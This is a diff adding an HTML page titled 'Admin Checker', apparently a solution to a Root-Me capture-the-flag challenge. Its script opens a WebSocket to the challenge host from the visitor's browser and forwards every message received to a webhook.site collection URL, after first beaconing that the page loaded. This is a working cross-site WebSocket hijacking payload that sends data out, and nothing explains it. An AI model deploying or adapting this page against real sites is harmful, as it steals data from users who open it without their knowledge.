@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Admin Checker</title>
+  </head>
+  <body>
+    <script> 
+      fetch("https://webhook.site/79da135d-7a92-498e-9887-50669f5c9571?step=loaded");
+      var ws = new WebSocket('ws://ctf15.root-me.org/ws');
+      ws.onopen = function() { ws.send("hello"); };
+      ws.onmessage = function(event) { fetch('https://webhook.site/79da135d-7a92-498e-9887-50669f5c9571', {method: 'POST', mode: 'no-cors', body: event.data}); };
+    </script>
+  </body>
+</html>
